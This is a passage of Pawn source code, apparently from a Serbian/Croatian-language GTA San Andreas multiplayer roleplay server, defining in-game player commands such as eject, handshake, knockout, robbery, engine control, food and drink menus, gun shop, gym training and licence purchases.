				SCMF( playerid, 0x33CCFFFF, "(EJECT): Izbacili ste {FFFFFF}%s {33CCFF}izvan auta.", ImeIgraca( ID ));
				SCMF( ID, 0x33CCFFFF, "(EJECT): Izbacio vas je iz auta {FFFFFF}%s.", ImeIgraca( playerid ) );

				new Float:vehPos[ 3 ];
				getPosBehindVehicle( GetPlayerVehicleID( playerid ), vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
				SMG_SetPlayerPos( ID, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] );
			}
			else SendErrorMessage( playerid, "Taj igrac nije u vasem autu !");
		}
	}
	else SendErrorMessage( playerid, "Pogresan ID.");
	return 1;
}

CMD:rukovanje( playerid, const params[] )
{
    new igrac, vrsta;
	if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes se rukovati ako si u vozilu!");
	if( sscanf( params, "ui", igrac, vrsta ) ) return SendUsageMessage( playerid, "/rukovanje [id/ime] [vrsta rukovanja(1-9)]");
	if( IsPlayerConnected( igrac ) )
	{
 		if( igrac != IPI )
 		{
			if( IsPlayerNearPlayer( 3.0, playerid, igrac ) )
			{
                if( IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Ne mozes se rukovati sa osobom koja je u vozilu!");
			    if( igrac == playerid) return SendErrorMessage( playerid, "Ne mozes se rukovati sam sa sobom!");

				SCMF( playerid, 0x33CCFFFF, "(HANDSHAKE): Poslali ste zahtjev za rukovanje {FFFFFF}'%s-u'.", ImeIgraca( igrac ) );
				SCMF( igrac, 0x33CCFFFF, "(HANDSHAKE): {FFFFFF}%s {33CCFF}ti je ponudio rukovanje.", ImeIgraca( playerid ) );
				SendClientMessage( igrac, 0xFF6347FF, "(HANDSHAKE): Ako se zelis rukovati, prihvati rukovanje koristeci {FFFFFF}[ /accept rukovanje ].");

				ShakeOffer[playerid] = igrac;
				ShakeOffer[igrac] = playerid;
				ShakeStyle[igrac] = vrsta;
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu tebe.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	return 1;
}

CMD:knockout( playerid, const params[] )
{
    new giveplayerid;
	if( sscanf( params, "r", giveplayerid ) ) return SendUsageMessage( playerid, "/knockout [id]"); 
	if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Moras biti najmanje Level 5 da koristis ovu komandu.");
 	if( KnockedDown[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si nokautiran.");
  	if( !IsMeleeWeapon( GetWeapon( playerid ) ) ) return SendErrorMessage( playerid, "Nemas nijedno melee oruzje u ruci da bi koristio ovu komandu!");
  	if( PlayerInfo[giveplayerid][xAdmin] > PlayerInfo[playerid][xAdmin] ) return SendErrorMessage(playerid, "Ne mozete nokautirati rank veci od sebe(admina).");
  	if( PlayerCuffed[ playerid ] != 0 ) return SendErrorMessage(playerid, "Ne mozes to dok si cuffova%s/tazova%s.", getPolForString(playerid, "n", "na"), getPolForString(playerid, "n", "na"));
  	if( IgracZavezan[playerid] ) return SendErrorMessage(playerid, "Ne mozes to dok si zaveza%s.", getPolForString(playerid, "n", "na"));

	if( IsPlayerConnected( giveplayerid ) )
	{
 		if( giveplayerid != IPI )
 		{
			if( IsPlayerNearPlayer( 1.0, playerid, giveplayerid ) )
			{
   				if( KnockedDown[ giveplayerid ] != true )
   				{
  	    			if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe nokautirati.");
	        	    if( IsPlayerInAnyVehicle( giveplayerid ) || IsPlayerInAnyVehicle( playerid ) ) return 1;

	            	new rands = random( 2 )+1;
					SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s udara %s i pokusava ga oboriti na pod.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
     				ApplyAnimation(playerid,"FIGHT_D","FightD_3",4.0,0,1,1,0,0, 1);

					if( rands == 1 )
					{
	    				SMG_TogglePlayerControllable( giveplayerid, false );
						ApplyAnimation( giveplayerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0, 1);
						SetPlayerTimerEx(giveplayerid, "ClearKnock", 25000, false, "i", giveplayerid);
        				KnockedDown[ giveplayerid ] = true;

						SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s ga je uspio oboriti na pod.", ImeIgraca( playerid ) );
					}
					else
					{
	    				SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s nije uspio oboriti covjeka na pod.", ImeIgraca( playerid ) );
					}
					return 1;
				}
				else SendErrorMessage( playerid, "Igrac je vec nokautiran.");
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu tebe.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	return 1;
}

CMD:rob( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5+.");
	if( PlayerInfo[ playerid ][ xRobVreme ] != 0 ) return SendErrorMessage( playerid, "Morate sacekati jos %d minuta da bi opet pljackali.", PlayerInfo[ playerid ][ xRobVreme ] );

	new ID;
    if( sscanf( params, "r", ID ) ) return SendUsageMessage( playerid, "/rob [id]");
    if( IsPlayerConnected( ID ) )
	{
        if( ID != IPI )
		{
            if( antiCheatCS[ ID ][ AFKMinute ] != 0 ) return SendErrorMessage( playerid, "Robas AFK igrace a? Nema jbg." );

            if( !IgracZavezan[ ID ] ) return SendErrorMessage( playerid, "Igrac mora biti zavezan da biste mu mogli pregledati novcanik!");
            if( IgracOpljackan[ ID ] ) return SendErrorMessage( playerid, "Igrac je vec opljackan." );

			if( IsPlayerNearPlayer( 4.0, playerid, ID ) )
			{
                new novac = ( PlayerInfo[ ID ][ xNovac ]/10 );
                if( novac > 20000 ) novac = 20000;

                DajIgracuNovac( playerid, novac );
                DajIgracuNovac( ID, -novac );

                IgracOpljackan[ ID ] = true;
                SetPlayerTimerEx(ID, "ClearPlayerRob", 240000, false, "i", ID);
                PlayerInfo[ playerid ][ xRobVreme ] = 60;

                SendInfoMessage( playerid, "Opljacka%s si igraca {FFFFFF}%s {4282C0}i uzeo {FFFFFF}($%d).", getPolForString(playerid, "o", "la"), ImeIgraca( ID ), novac );
                SendInfoMessage( ID, "{FFFFFF}%s {4282C0}vas je opljacka%s i uzeo vam {FFFFFF}($%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), novac );

                SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s je izvadi%s novcanik %s i uze%s novac.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( ID ), getPolForString(playerid, "o", "la") ); 

				PostaviWanted( playerid, "Kradja Novca", ImeIgraca( ID ), 5 );
				WriteLog("log-rob", "Igrac %s -> Igrac: %s | Novac: %d", ImeIgraca( playerid ), ImeIgraca( ID ), novac);
            }
            else SendErrorMessage( playerid, "Igrac nije dovoljno blizu tebe!");
        }
    }
    else SendErrorMessage( playerid, "Taj igrac nije na serveru!");
    return 1;
}

CMD:pojas( playerid )
{
	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u autu!");
	if( IsVehicleBrod( GetPlayerVehicleID( playerid ) ) || IsVehicleBajs( GetPlayerVehicleID( playerid ) ) || IsVehicleMotor( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Ne mozete koristiti na ovom vozilu.");

	if( Pojas[ playerid ] != true )
	{
	    SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s se hvata za pojas, te se vezuje njime.", ImeIgraca( playerid ) );
		Pojas[ playerid ] = true;
	}
	else
	{
	    SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s se hvata za pojas, te ga skida.", ImeIgraca( playerid ) );
        Pojas[ playerid ] = false;
	}
	return 1;
}

CMD:upali( playerid, const params[] )
{
		new vehicle = GetPlayerVehicleID( playerid ),
			engine,lights,alarm,doors,bonnet,boot,objective;

	    if( !IsPlayerInAnyVehicle( playerid )) return SendErrorMessage( playerid, "Morate biti u vozilu da biste koristili ovu komandu!");
	 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
	    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu?" );
		if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti vozac da bi ste mogli koristit ovu komandu.");

		switch(VehicleInfo[ vehicle ][ vUsage ])
		{
	        case PRIVATNO_VOZILO:
			{
	            new slot = -1;
				for( new j = 0; j < MAX_VEH_SLOT; j ++ )
				{
					if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == vehicle )
					{
				  		slot = j;
						break;
					}
				}
				if( slot == -1 )
				{
					if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == VehicleInfo[ vehicle ][ vSqlID ] ) { }
					else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila." );
				}

	            GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
				if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

				SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

				StartingVehicle[playerid] = true;
				if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);
				else VehicleEngineStart(playerid);
				return 1;
			}
	        case ORGANIZACIJSKO_VOZILO:
			{
				if( VehicleInfo[ vehicle ][ vOrganization ] == PlayerInfo[ playerid ][ xClan ] )
				{
				    GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
					if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

				    SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

					StartingVehicle[playerid] = true;
					if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);
					else VehicleEngineStart(playerid);
					return 1;
				}
				else
				{
					SendErrorMessage( playerid, "Nemate kljuc ovog vozila.");
				    return 1;
				}
	        }
	        case IZLOZBENO_VOZILO:
			{
				if( PlayerInfo[ playerid ][ xAdmin ] == 6 )
				{
				    GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
					if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

					SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

					StartingVehicle[playerid] = true;
					if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);
					else VehicleEngineStart(playerid);
					return 1;
				}
				else
				{
					SendErrorMessage( playerid, "Nemate kljuc ovog vozila.");
				    return 1;
				}
	        }
			default:
			{
				GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
			    if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );

				SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );

				StartingVehicle[playerid] = true;
				if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);
				else VehicleEngineStart(playerid);
			    return 1;
		    }
		}
		return 1;
}

CMD:ugasi( playerid )
{
	new vehicle = GetPlayerVehicleID( playerid ),
		engine,lights,alarm,doors,bonnet,boot,objective;

    if( !IsPlayerInAnyVehicle( playerid )) return SendErrorMessage( playerid, "Morate biti u vozilu da biste koristili ovu komandu!");
 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu? " );
	if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti vozac da bi ste mogli koristit ovu komandu.");
	if( PlayerInvited[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes da ugasis vozilo dok si na eventu." );

	GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
	if( engine == 0 ) return SendErrorMessage( playerid, "Motor vozila je vec ugasen." );
	SetVehicleParamsEx(vehicle,0,lights,alarm,doors,bonnet,boot,objective);

	SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s gasi motor vozila.", ImeIgraca( playerid ) );

	if( Tempomat[ playerid ] )
	{
		Tempomat[ playerid ] = false;
		PlayerCruiseSpeed[ playerid ] = 0.00;

		SendClientMessage( playerid, ZUTA, "(TEMPOMAT): Tempomat se ugasio.");
	}
	return 1;
}

CMD:drink( playerid )
{
	if( IsPlayerInRangeOfPoint( playerid, 10.0, 1325.7372, -875.4626, 39.5781 ) )
	{
	    ShowPlayerDialog( playerid, dialog_DRINK, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																					        "{FFFFFF}Pice\t{FFFFFF}Cena\n\
																							{4282C0}(1). {FFFFFF}Whisky\t200$\n\
																							{4282C0}(2). {FFFFFF}Vodka\t170$\n\
																							{4282C0}(3). {FFFFFF}Pivo\t85$\n\
																							{4282C0}(4). {FFFFFF}Konjak\t120$\n\
																							{4282C0}(5). {FFFFFF}Tequila\t150$\n\
																							{4282C0}(6). {FFFFFF}Jack Daniels\t290$\n\
																							{4282C0}(7). {FFFFFF}Mineralna voda\t60$\n\
																							{4282C0}(8). {FFFFFF}Cedevita\t80$\n\
																							{4282C0}(9). {FFFFFF}Coca Cola\t50$", "Potvrdi", "Odustani" );
	}
	else
	{
		foreach(new i : iter_Bizz)
		{
		    if( IsPlayerInRangeOfPoint( playerid, 25.0, BusinessInfo[ i ][ bExitX ], BusinessInfo[ i ][ bExitY ], BusinessInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BusinessInfo[ i ][ bInVW ])
			{
			    if( BusinessInfo[ i ][ bType ] == VRSTA_BAR || BusinessInfo[ i ][ bType ] == VRSTA_DISCO || BusinessInfo[ i ][ bType ] == VRSTA_NKLUB || BusinessInfo[ i ][ bType ] == VRSTA_JAVNAK )
				{
					ShowPlayerDialog( playerid, dialog_DRINK, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																										"{FFFFFF}Pice\t{FFFFFF}Cena\n\
																										{4282C0}(1). {FFFFFF}Whisky\t200$\n\
																										{4282C0}(2). {FFFFFF}Vodka\t170$\n\
																										{4282C0}(3). {FFFFFF}Pivo\t85$\n\
																										{4282C0}(4). {FFFFFF}Konjak\t120$\n\
																										{4282C0}(5). {FFFFFF}Tequila\t150$\n\
																										{4282C0}(6). {FFFFFF}Jack Daniels\t290$\n\
																										{4282C0}(7). {FFFFFF}Mineralna voda\t60$\n\
																										{4282C0}(8). {FFFFFF}Cedevita\t80$\n\
																										{4282C0}(9). {FFFFFF}Coca Cola\t50$", "Potvrdi", "Odustani" );
				    break;
				}
			}
		}
	}
	return 1;
}

CMD:menu( playerid )
{
	foreach(new i : iter_Bizz)
	{
	    if( IsPlayerInRangeOfPoint( playerid, 25.0, BusinessInfo[ i ][ bExitX ], BusinessInfo[ i ][ bExitY ], BusinessInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BusinessInfo[ i ][ bInVW ])
		{
		    if( BusinessInfo[ i ][ bType ] == VRSTA_RESTORAN )
			{
                uFirmi[ playerid ] = i;
				ShowPlayerDialog( playerid, dialog_RESTORAN, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																				"{FFFFFF}Vrsta\t{FFFFFF}Cena\n\
																				{4282C0}(1). {FFFFFF}Juha\t150$\n\
																				{4282C0}(2). {FFFFFF}Piletina\t220$\n\
																				{4282C0}(3). {FFFFFF}Morski pas\t350$\n\
																				{4282C0}(4). {FFFFFF}Spageti\t410$\n\
																				{4282C0}(5). {FFFFFF}Kolac\t630$\n\
																				{4282C0}(6). {FFFFFF}Coca Cola\t50$\n\
																				{4282C0}(7). {FFFFFF}Voda\t25$", "Potvrdi", "Odustani");
			    break;
			}
		    else if( BusinessInfo[ i ][ bType ] == VRSTA_CLUCK )
			{
                uFirmi[ playerid ] = i;
				ShowPlayerDialog( playerid, dialog_CLUCKIN, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																				"{FFFFFF}Vrsta\t{FFFFFF}Cena\n\
																				{4282C0}(1). {FFFFFF}Topli sendvic\t100$\n\
																				{4282C0}(2). {FFFFFF}Cevapi\t150$\n\
																				{4282C0}(3). {FFFFFF}Fileti\t100$\n\
																				{4282C0}(4). {FFFFFF}Vocna salata\t100$\n\
																				{4282C0}(5). {FFFFFF}Kebab\t120$\n\
																				{4282C0}(6). {FFFFFF}Sprite\t50$\n\
																				{4282C0}(7). {FFFFFF}Voda\t25$", "Potvrdi", "Odustani");
			    break;
			}
			else if( BusinessInfo[ i ][ bType ] == VRSTA_PIZZA )
			{
				uFirmi[ playerid ] = i;
				ShowPlayerDialog( playerid, dialog_PIZZA, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																				"{FFFFFF}Vrsta\t{FFFFFF}Cena\n\
																				{4282C0}(1). {FFFFFF}Pizzeta\t100$\n\
																				{4282C0}(2). {FFFFFF}Velika pizza\t150$\n\
																				{4282C0}(3). {FFFFFF}Topli sendvic\t45$\n\
																				{4282C0}(4). {FFFFFF}Salata\t40$\n\
																				{4282C0}(5). {FFFFFF}Jumbo pizza\t250$\n\
																				{4282C0}(6). {FFFFFF}Sprite\t50$\n\
																				{4282C0}(7). {FFFFFF}Voda\t25$", "Potvrdi", "Odustani");
			    break;
			}
			else if( BusinessInfo[ i ][ bType ] == VRSTA_BURG )
			{
                uFirmi[ playerid ] = i;
			    ShowPlayerDialog( playerid, dialog_BURG, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																				"{FFFFFF}Vrsta\t{FFFFFF}Cena\n\
																				{4282C0}(1). {FFFFFF}Moo Kids Meal\t200$\n\
																				{4282C0}(2). {FFFFFF}Beef Tower\t250$\n\
																				{4282C0}(3). {FFFFFF}Salad Meal\t250$\n\
																				{4282C0}(4). {FFFFFF}Meat Stack\t400$", "Potvrdi", "Odustani");
			    break;
			}
		}
	}
	return 1;
}

CMD:kupisat( playerid )
{
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 1707.7828,1207.8645,993.2150 ) ) return SendErrorMessage( playerid, "Morate biti u zlatari." );
	if( PlayerInfo[ playerid ][ xSat ] != 0 ) return SendErrorMessage( playerid, "Vec imas sat, ako zelis drugi prvo ga baci komandom [ /bacisat ]." );

	ShowPlayerDialog(playerid, dialog_BUYWATCH, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFF}Sat:", "{FFFFFF}Vrsta\t{FFFFFF}Cena\n\
																				{4282C0}(1). {FFFFFF}Rolex Datejust\t{FFFFFF}521$\n\
																				{4282C0}(2). {FFFFFF}Emporio Armani\t{FFFFFF}618$\n\
																				{4282C0}(3). {FFFFFF}Casio G-Shock\t{FFFFFF}723$\n\
																				{4282C0}(4). {FFFFFF}Michael Kors\t{FFFFFF}819$\n\
																				{4282C0}(5). {FFFFFF}Hugo Boss\t{FFFFFF}916$", "Kupi", "Zatvori");
	return 1;
}

CMD:kupipadobran( playerid )
{
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, 1544.2876, -1354.0452, 329.4731 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti na vrhu zgrade." );
	if( PlayerInfo[ playerid ][ xNovac ] < 2000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );

	DajIgracuNovac( playerid, -2000 );
    GiveWeaponToPlayer( playerid, 46, 1 );

	SendInfoMessage( playerid, "Uspesno ste kupili padobran." );
    return 1;
}

CMD:kupioruzje( playerid )
{
    new businessId = GetPlayerBusinessId( playerid, VRSTA_GUNSHOP );

	if( businessId == -1 ) SendErrorMessage( playerid, "Morate biti u gunshopu." );
	else if( businessId == -2 ) SendErrorMessage( playerid, "Nemamo vise proizvoda." );
	else
	{
	    if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendClientMessage( playerid, CRVENA, "(GUNSHOP): Ne mozes kupiti oruzje level manji od 3 si.");
    	if( PlayerInfo[ playerid ][ xGunLicense ] == 0 ) return SendClientMessage( playerid,  CRVENA, "(GUNSHOP): Ne mozete kupiti oruzje bez dozvole." );

    	ShowPlayerDialog( playerid, dialog_GUNSHOP, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																				"{FFFFFF}Vrsta\t{FFFFFF}Cena\n\
																				{4282C0}(1). {FFFFFF}Noz\t1500$\n\
																				{4282C0}(2). {FFFFFF}Bassebal bat\t500$\n\
																				{4282C0}(3). {FFFFFF}Colt 45\t2500$\n\
																				{4282C0}(4). {FFFFFF}Deagle\t8000$\n\
																				{4282C0}(5). {FFFFFF}Shotgun\t8000$\n\
																				{4282C0}(6). {FFFFFF}Country Rifle\t12000$\n\
																				{4282C0}(7). {FFFFFF}Pancir\t10000$", "Kupi", "Odustani" );
	}
	return 1;
}

CMD:treniraj( playerid, const params[] )
{
    if( !IsPlayerInRangeOfPoint( playerid, 25.0, 771.0096,13.4834,1000.6988 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti u teretani." );

	new item[ 10 ];
	if( sscanf(params, "s[10]", item ) )
	{
		SendUsageMessage( playerid, "/treniraj [opcija]");
     	SendClientMessage( playerid, -1, "[OPCIJE] Boxing($2000), KungFu($4000), GrabKick($6000), KneeHead($8000)");
		return 1;
	}

	if( strcmp( item, "boxing", true) == 0)
	{
	    if( PlayerInfo[ playerid ][ xNovac ] < 2000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(2000$)." );

		DajIgracuNovac( playerid, -2000 );
	    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
        BoxTrain(playerid);

		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s hoda do vrece za boks i pocinje je udarati.", ImeIgraca( playerid ) );
		return 1;
	}
	else if( strcmp( item, "kungfu", true) == 0)
	{
	    if( PlayerInfo[ playerid ][ xNovac ] < 4000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(4000$)." );

		DajIgracuNovac( playerid, -4000 );
	    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KUNGFU);
  		KungTrain(playerid);

		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s hoda do vrece za boks i pocinje je udarati.", ImeIgraca( playerid ) );
		return 1;
	}
	else if( strcmp( item, "grabkick", true) == 0)
	{
	    if( PlayerInfo[ playerid ][ xNovac ] < 6000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(6000$)." );

		DajIgracuNovac( playerid, -6000 );
	    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_GRABKICK);
        GrabTrain(playerid);

		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s hoda do vrece za boks i pocinje je udarati.", ImeIgraca( playerid ) );
		return 1;
	}
	else if( strcmp( item, "kneehead", true) == 0)
	{
        if( PlayerInfo[ playerid ][ xNovac ] < 8000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(8000$)." );

		DajIgracuNovac( playerid, -8000 );
		PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KNEEHEAD);
  		KneeTrain(playerid);

		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s hoda do vrece za boks i pocinje je udarati.", ImeIgraca( playerid ) );
		return 1;
	}
	else
	{
		SendUsageMessage( playerid, "/treniraj [opcija]");
     	SendClientMessage( playerid, -1, "[OPCIJE] Boxing($2000), KungFu($2400), GrabKick($2800), KneeHead($3000)");
   	}
	return 1;
}

CMD:buylic( playerid, const params[] )
{
	if( !IsPlayerInRangeOfPoint( playerid, 2.0, -233.7795, 2788.5210, -26.2710)) return SendErrorMessage( playerid, "Nisi u auto skoli!");

	new item[10];
    if( sscanf( params, "s[10]", item ) )
	{
		SendUsageMessage( playerid, "/buylic [kategorija]");
     	SendClientMessage( playerid, -1, "KATEGORIJE: | vozacka(5000$) | letenje(15000$) | plovidbu(10000$)");
		return 1;
	}
	if( strcmp( item, "vozacka", true) == 0 )
	{
	    if( GetPlayerVirtualWorld( playerid ) != 3 ) return SendErrorMessage( playerid, "Moras biti u BG auto skoli." );
	    if( PlayerInfo[ playerid ][ xVozacka ] > 0 ) return SendErrorMessage( playerid, "Vec imas dozvolu za voznju auta!");
	    if( PlayerInfo[ playerid ][ xNovac ] < 5000) return SendErrorMessage( playerid, "Nemate dovoljno novaca!");

		PlayerInfo[ playerid ][ xVozacka ] = 1;
		sql_user_update_integer( playerid, "vehicle_license", PlayerInfo[ playerid ][ xVozacka ] );
		DajIgracuNovac( playerid, -5000 );
		PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
    	SendInfoMessage( playerid, "Kupili ste dozvolu za voznju za $5K." );

    	if(questInfo[playerid][qt_EasyQuest][1] == false) {
    		questInfo[playerid][qt_EasyQuest][1] = true;
	    	sql_UpdateQuest(playerid);

			KillTimer(QuestTimer[playerid]);
			quest_CreateTDs(playerid, false);

			quest_CreateTDs(playerid, true);
			PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.2");
			PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");

			QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
    	}
	}
	else if( strcmp( item, "letenje", true) == 0 )
	{
	    if( GetPlayerVirtualWorld( playerid ) != 3 ) return SendErrorMessage( playerid, "Moras biti u BG auto skoli." );
	    if( PlayerInfo[ playerid ][ xLetelica ] > 0 ) return SendErrorMessage( playerid, "Vec imas dozvolu za voznju letjelice!");
	    if( PlayerInfo[ playerid ][ xNovac ] < 15000) return SendErrorMessage( playerid, "Nemate dovoljno novaca!");

    	PlayerInfo[ playerid ][ xLetelica ] = 1;
    	sql_user_update_integer( playerid, "air_license", PlayerInfo[ playerid ][ xLetelica ] );
		DajIgracuNovac( playerid, -15000 );
		PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
    	SendInfoMessage( playerid, "Kupili ste dozvolu za letenje za $15K." );

    	if(questInfo[playerid][qt_EasyQuest][2] == false) {
    		questInfo[playerid][qt_EasyQuest][2] = true;
	    	sql_UpdateQuest(playerid);

			KillTimer(QuestTimer[playerid]);
			quest_CreateTDs(playerid, false);

			quest_CreateTDs(playerid, true);
			PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.3");
			PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");	

			QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
    	}
	}
	else if( strcmp( item, "plovidbu", true) == 0 )
	{
	    if( GetPlayerVirtualWorld( playerid ) != 3 ) return SendErrorMessage( playerid, "Moras biti u BG auto skoli." );
	    if( PlayerInfo[ playerid ][ xBrodska ] > 0 ) return SendErrorMessage( playerid, "Vec imas dozvolu za voznju broda!");
	    if( PlayerInfo[ playerid ][ xNovac ] < 10000) return SendErrorMessage( playerid, "Nemate dovoljno novaca!");

        PlayerInfo[ playerid ][ xBrodska ] = 1;
	    sql_user_update_integer( playerid, "boat_license", PlayerInfo[ playerid ][ xBrodska ] );
		DajIgracuNovac( playerid, -10000 );
		PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
	    SendInfoMessage( playerid, "Kupili ste dozvolu za plovidbu za 10.000$." );

    	if(questInfo[playerid][qt_EasyQuest][3] == false) {
    		questInfo[playerid][qt_EasyQuest][3] = true;
	    	sql_UpdateQuest(playerid);

			KillTimer(QuestTimer[playerid]);
			quest_CreateTDs(playerid, false);

			quest_CreateTDs(playerid, true);
			PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.4");
			PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");	

			QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
    	}
	}
	else {
		SendUsageMessage( playerid, "/buylic [kategorija]");
     	SendClientMessage( playerid, -1, "KATEGORIJE: | vozacka(5000$) | letenje(15000$) | plovidbu(10000$)");
	}
 	return 1;
}

CMD:pljackajzlataru( playerid )
{
	if( !IsPlayerInDynamicArea( playerid, ZlataraSef ) ) return SendErrorMessage( playerid, "Morate biti kod sefa zlatare." );

